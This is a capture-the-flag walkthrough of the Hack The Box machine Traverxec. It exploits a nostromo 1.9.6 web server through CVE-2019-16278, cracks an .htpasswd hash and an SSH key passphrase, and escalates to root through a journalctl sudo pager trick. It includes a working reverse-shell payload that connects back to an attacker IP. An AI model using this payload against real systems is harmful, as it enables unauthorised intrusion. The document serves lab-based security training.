# [Traverxec](https://app.hackthebox.com/machines/Traverxec)


```bash
nmap -sT -p- --min-rate 5000 10.10.10.165 -Pn 
```
![Alt text](img/image.png)

Let's do greater nmap for 22,80 open ports.


```bash
nmap -sC -sV -A -p22,80 10.10.10.165 -Pn 
```

![Alt text](img/image-1.png)


Here, I just learn that HTTP port is running via software called and version of this like ' nostromo 1.9.6 '

Let's search exploit for this.

I found this (CVE-2019-16278)

![Alt text](img/image-2.png)


I did this by manually, let's look at this.

I send POST request like below.

![Alt text](img/image-3.png)


And I got result on reverse connection.

![Alt text](img/image-4.png)


Now, it's time to reverse shell, below one is our reverse shell payload, let's look at this.

```bash
curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.6/1337 0>&1"'
```

![Alt text](img/image-5.png)


I got reverse shell.

![Alt text](img/image-6.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-7.png)


After enumeration of linux machine, I find interesint file that contains username and hashed password on this directory (/var/nostromo/conf/.htpasswd)

![Alt text](img/image-8.png)


Let's try to crack this hash.

```bash
hashcat -m 500 hash.txt --wordlist /usr/share/wordlists/rockyou.txt 
```

![Alt text](img/image-9.png)


Now we can see that password is Nowonly4me


david: Nowonly4me

This credentials is just for `10.10.10.165/~david/` endpoint.

Another interesting directory, I find that '/home/david/public_www/protected-file-area', here we have file, let's send to our machine.

Then, I see that, I need to enter this username and password to get this file.

```bash
wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
```

And we extract like below.

```bash
tar -zxvf backup-ssh-identity-files.tgz 
```

![Alt text](img/image-10.png)


Let's change privilege and try to login via SSH.
I see that it asks passphrase from me, let's do `ssh2john` tool to find **passphrase**.

```bash
ssh2john home/david/.ssh/id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```


![Alt text](img/image-11.png)


passphrase is **hunter**.

I changed file permission of id_rsa file and connect to machine.

```bash
chmod 600 home/david/.ssh/id_rsa 
ssh -i home/david/.ssh/id_rsa david@10.10.10.165 
```


user.txt

![Alt text](img/image-12.png)



For privilege escalation, I find interesting path (/home/david/bin), there is bash script which runs via **sudo** privileges, that's why I checked [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/)


![Alt text](img/image-13.png)


I need to run as below.

```bash
stty rows 4
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
#!/bin/sh
```


root.txt

![Alt text](img/image-14.png)  




